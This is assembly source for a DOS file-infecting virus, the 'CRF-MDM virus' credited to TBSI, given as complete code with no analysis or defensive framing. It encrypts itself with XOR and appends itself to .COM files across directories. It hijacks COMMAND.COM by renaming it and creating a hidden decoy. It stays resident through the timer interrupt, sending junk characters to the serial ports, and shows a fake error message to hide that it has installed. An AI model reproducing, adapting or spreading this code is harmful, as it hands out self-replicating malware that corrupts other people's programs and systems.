

	title "CRF-MDM virus.  Born on the Fourth of July.  Written by TBSI."
							page 60,80
code segment						word public 'code'
							assume cs:code,ds:code
							org	100h
							main proc;edure
							cr		equ 13
							lf		equ 10
							max2kill	equ 3

tof:							;Top-Of-File
		jmp	short begin			;Skip over program
		nop					;Reserve 3rd byte
EOFMARK:	db	26				;Disable DOS's TYPE

first_four:	nop					;First run copy only!
address:	int	20h				;First run copy only!
check:		nop					;First run copy only!

begin:		call	nextline			;Push BP onto stack
nextline:	pop	bp				;BP=location of Skip
		sub	bp,offset nextline		;BP=offset from 1st run

		lea	bx,[bp+offset continue_here]	;Where to start at
		push	bx				;and where to RET to

cryptor:	mov	al,[bp+offset code_number]	;Get code number
		mov	cx,offset eof-offset continue_here   ;Length of code
cryptor_loop:	xor	[bx],al				;En/De crypt
		inc	bx				;Next byte
		loop	cryptor_loop			;Keep going
		ret					;All done

code_number	db	0				;Code number

infect:		pop	ax				;Saved AX for INT 21h
		pop	bx				;Saved BX for INT 21h
		pop	cx				;Saved CX for INT 21h
		int	21h				;Do INT 21h
		pop	bx				;Saved BX for cryptor
		ret					;Jump to cryptor

continue_here:	mov	byte ptr [bp+offset inCC],0	;Enable TSRing
		mov	byte ptr [bp+offset infected],0	;Reset infection count
		mov	si,2Ch				;New code number's addr
		mov	dl,[si]				;DL=env. seg's low byte
		mov	[bp+offset code_number],dl	;Save lower byte as CN

		lea	si,[bp+offset first_four]	;Original first 4 bytes
		mov	di,offset tof			;TOF never changes
		mov	cx,4				;Lets copy 4 bytes
		cld					;Read left-to-right
		rep	movsb				;Copy the 4 bytes

		mov	ah,1Ah				;Set DTA address ...
		lea	dx,[bp+offset DTA]		; ... to *our* DTA
		int	21h				;Call DOS to set DTA

		cmp	byte ptr [bp+offset fname],'*'	;1st byte '*' ???
		jne	SoWhat				;Nope, let's go on!
		inc	byte ptr [bp+offset inCC]	;DO NOT TSR!!!
		jmp	short start_search		;Go get normal files

SoWhat:		xor	si,si				;SI=0
		mov	ds,si				;DS=0
		mov	si,33Ch				;Point to TSRflag
		lodsb					;AL=TSR indicator
		push	cs				;Transfer CS ...
		pop	ds				; ... to DS
		cmp	al,0CFh				;TSR flag set?
		je	start_search			;yes, go elsewhere

		mov	ah,56h				;Rename file
		lea	dx,[bp+offset cmdspec]		;DS:DX-} C:\COMMAND.COM
		lea	di,[bp+offset hidspec]		;ES:DI-} COMMANDÿ.COM
		int	21h				;Rename it
		jc	start_search			;Oops!

		mov	ah,3Ch				;Create file
		mov	cx,0000000000000010B		;w/attributes: ----H-
		int	21h				;Call DOS to create it
		jc	start_search			;Oops!
		mov	bx,ax				;Save handle
		mov	ah,40H				;Write to file
		mov	cx,8				;8 bytes
		lea	dx,[bp+offset blankfile]	;Point to 8 NOPs
		int	21h				;Write to file
		mov	ah,3eh				;Close file
		int	21h				;Call DOS to ^

		mov	ax,3D02h			;Open file
		lea	dx,[bp+offset cmdspec]		;DS:DX-} C:\COMMAND.COM
		int	21h				;Open file
		mov	byte ptr [bp+offset filename],'*'  ;Set flag
		jnc	get_command_com			;Go get it!

StartUp:	mov	byte ptr [bp+offset flag],0	;Clear flag
start_search:	mov	ah,4Eh				;Find First ASCIIZ
		lea	dx,[bp+offset filespec]		;DS:DX -} '*.COM',0
		push	dx				;Save DX
		jmp	short continue			;Continue...

return:		mov	ah,1ah				;Set DTA address ...
		mov	dx,80h				; ... to default DTA
		int	21h				;Call DOS to set DTA
		xor	ax,ax				;AX= 0
		mov	bx,ax				;BX= 0
		mov	cx,ax				;CX= 0
		mov	dx,ax				;DX= 0
		mov	si,ax				;SI= 0
		mov	di,ax				;DI= 0
		mov	sp,0FFFEh			;SP= 0
		mov	bp,100h				;BP= 100h (RETurn addr)
		push	bp				; Put on stack
		mov	bp,ax				;BP= 0
		ret					;JMP to 100h

nextfile:	or	bx,bx				;Did we open the file?
		jz	skipclose			;No, so don't close it
		mov	ah,3Eh				;Close file
		int	21h				;Call DOS to close it
		xor	bx,bx				;Set BX back to 0
skipclose:	mov	ah,4Fh				;Find Next ASCIIZ

		cmp	byte ptr [bp+offset flag],0	;Flag set?
		jnz	StartUp				;Flag was set

continue:	pop	dx				;Restore DX
		push	dx				;Re-save DX
		xor	cx,cx				;CX= 0
		xor	bx,bx
		int	21h				;Find First/Next
		jnc	skipjmp
		jmp	NoneLeft			;Out of files

skipjmp:	cmp	byte ptr [bp+offset filename+7],'ÿ'   ;8th char a 255?
		jne	open_it				;Nope, this one's okay!
		mov	byte ptr [bp+offset filename+7],'.'   ;Change it
		jmp	nextfile			;Next file please!

open_it:	mov	ax,3D02h			;open file
		lea	dx,[bp+offset filename]		;Point to file
		int	21h				;Call DOS to open file
		jc	nextfile			;Next file if error

get_command_com:
		mov	bx,ax				;get the handle
		mov	ah,3Fh				;Read from file
		mov	cx,4				;Read 4 bytes
		lea	dx,[bp+offset first_four]	;Read in the first 4
		int	21h				;Call DOS to read

		cmp	byte ptr [bp+offset check],26	;Already infected?
		je	nextfile			;Yep, try again ...
		cmp	byte ptr [bp+offset first_four],77  ;Mis-named .EXE?
		je	nextfile			;Yep, maybe next time!

		mov	ax,4202h			;LSeek to EOF
		xor	cx,cx				;CX= 0
		xor	dx,dx				;DX= 0
		int	21h				;Call DOS to LSeek

		cmp	ax,0FD00h			;Longer than 63K?
		ja	nextfile			;Yep, try again...
		cmp	ax,8				;Shorter than 8 bytes?
		jb	nextfile			;Yep, try again...
		mov	[bp+offset addr],ax		;Save call location

		mov	ah,40h				;Write to file
		mov	cx,4				;Write 4 bytes
		lea	dx,[bp+offset first_four]	;Point to buffer
		int	21h				;Save the first 4 bytes

		push	cs
		push	cs
		pop	ds
		pop	es

		mov	cx,13				;13 bytes
		lea	si,[bp+offset filename]		;Target's filename
		lea	di,[bp+offset fname]		;Destination for ^
		rep	movsb				;Copy it

; This may be a little confusing, but it sets up the stack for infection

		push	bx				;Save handle for later
		lea	dx,[bp+offset return_here]	;RETaddr for cryptor
		push	dx				;Save it
		lea	dx,[bp+offset cryptor]		;RETaddr for infect
		push	dx				;Save it
		lea	dx,[bp+offset continue_here]	;Start addr for cryptor
		push	dx				;Save it
		mov	si,dx				;Save in SI
		mov	ah,40h				;Write to file
		mov	cx,offset eof-offset begin	;Length of target code
		push	cx				;CX for INT 21h
		push	bx				;BX for INT 21h
		push	ax				;AX for INT 21h
		lea	dx,[bp+offset infect]		;Point to infect
		push	dx				;Save it
		lea	dx,[bp+offset begin]		;Point to virus start
		mov	bx,si				;BX=Start addr-}cryptor
		jmp	cryptor				;Append the virus code

return_here:	pop	bx				;Restore handle
		mov	ax,4200h			;LSeek to TOF
		xor	cx,cx				;CX= 0
		xor	dx,dx				;DX= 0
		int	21h				;Call DOS to LSeek

		mov	ax,[bp+offset addr]		;Retrieve location
		inc	ax				;Adjust location

		mov	[bp+offset address],ax		;address to call
		mov	byte ptr [bp+offset first_four],0E9h  ;JMP rel16 inst.
		mov	byte ptr [bp+offset check],26	;EOFMARK

		mov	ah,40h				;Write to file
		mov	cx,4				;Write 4 bytes
		lea	dx,[bp+offset first_four]	;4 bytes are at [DX]
		int	21h				;Write to file

		inc	byte ptr [bp+offset infected]	;increment counter
		cmp	byte ptr [bp+offset infected],max2kill	;Satisfied yet?
		jnl	NoneLeft			;We're through!
		jmp	nextfile			;Any more?

NoneLeft:	cmp	byte ptr [bp+offset infected],2	;At least 2 infected?
		jae	TheEnd				;The party's over!

		mov	di,100h				;DI= 100h
		cmp	word ptr [di],20CDh		;an INT 20h?
		je	TheEnd				;Don't go to prev. dir.

		lea	dx,[bp+offset prevdir]		;'..'
		mov	ah,3Bh				;Set current directory
		int	21h				;CHDIR ..
		jc	TheEnd				;We're through!
		mov	ah,4Eh
		jmp	continue			;Start over in new dir

TheEnd:		xor	di,di				;SI=0
		mov	ds,di				;DS=0
		mov	si,33Ch				;Unused spot in memory
		cmp	byte ptr ds:[si],0CFh		;Already active?
		jne	TE1				;Nope, continue

PartyOver:	jmp	return				;The party's over!
Chain:		push	cs				;Transfer CS ...
		pop	ds				; ... to DS
		mov	ah,4ah				;Resize memory
		lea	bx,[bp+offset eop]		;Point to End-Of-Prog.
		shr	bx,1
		shr	bx,1
		shr	bx,1
		shr	bx,1
		inc	bx				;BX=Size of block
		int	21h				;Call DOS to resize mem
				
		mov	ax,4B00h			;Load & execute
		lea	dx,[bp+offset hidspec]		; -} C:\COMMANDÿ.COM
		mov	[bp+offset cs1],cs		;Save CS in execblock
		mov	[bp+offset cs2],cs		;Save CS in execblock
		mov	[bp+offset cs3],cs		;Save CS in execblock
		lea	bx,[bp+offset execblock]	;Point to spot in PSP
		int	21h				;Call DOS to ^^^
		jmp	return

TE1:		dec	byte ptr [bp+offset inCC]	;In command.com?
		jz	Chain				;Yes, stop!
		lea	dx,[bp+offset eof+1]		;Point to EOF+1
		cmp	dx,0FFF0h			;Will the value work?
		ja	PartyOver			;Nope, won't work. Stop
		mov	byte ptr ds:[si],0CFh		;Set Flag
		push	dx				;Save DX for later

		push	cs				;Move CS ...
		pop	ds				; ... to DS

		clc					;Clear carry
		mov	ax,3508h			;Get vector for INT 8
		int	21h				;Call DOS to ^
		mov	[di+0FCh],bx			;Save offset
		mov	[di+0FEh],es			;Save segment

		lea	dx,[bp+offset our8]		;Point to routine
		mov	ax,2508h			;Set vector for INT 8
		int	21h				;Call DOS to ^

		lea	dx,[bp+offset tsrmsg]		;Point to message
		mov	ah,9				;Print message
		int	21h				;Call DOS to ^

		pop	dx				;Restore saved DX
		int	27h				;Call DOS to TSR

our8:		pushf
		push	ax
		push	dx				;Save DX
		mov	al,'Û'				;Character to use
		mov	dx,2e8h				;DX=port number
		out	dx,al				;Send directly to port
		mov	dx,2f8h				;DX=port number
		out	dx,al				;Send directly to port
		mov	dx,3e8h				;DX=port number
		out	dx,al				;Send directly to port
		mov	dx,3f8h				;DX=port number
		out	dx,al				;Send directly to port
not_this_time:	pop	dx				;Restore DX
		pop	ax
		popf
		jmp	dword ptr cs:[0FCh]		;Call old handler

tsrmsg		db	'Bad command or file name',cr,lf,'$'   ;Faker for TSR
cmdspec		db	'C:\COMMAND.COM',0		;File specification
hidspec		db	'C:\COMMANDÿ.COM',0		;File specification

filespec	db	'*.COM',0			;File specification
prevdir		db	'..',0				;Previous directory
fname		db	'1st run copy!'			;Filename
blankfile:	nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop

execblock	dw	0				;Use copy of same env.
		dw	80h				;Points to command tail
cs1:		dw	?				;Points to Code Segment
		dw	5Ch				;Points to 1st FCB
cs2:		dw	?				;Points to Code Segment
		dw	6Ch				;Points to 2nd FCB
cs3:		dw	?				;Points to Code Segment


; None of this information is included in the virus's code.  It is only used
; during the search/infect routines and it is not necessary to preserve it
; in between calls to them.
eof:



DTA:		db	21 dup (?)			;internal search's data

attribute	db	?				;attribute
file_time	db	2 dup (?)			;file's time stamp
file_date	db	2 dup (?)			;file's date stamp
file_size	db	4 dup (?)			;file's size
filename	db	13 dup (?)			;filename

infected	db	?				;infection count

addr		dw	?				;Address
flag		db	?				;Flag
incc		db	?				;Flag

eop:

							main endp;rocedure
							code ends;egment

			end main
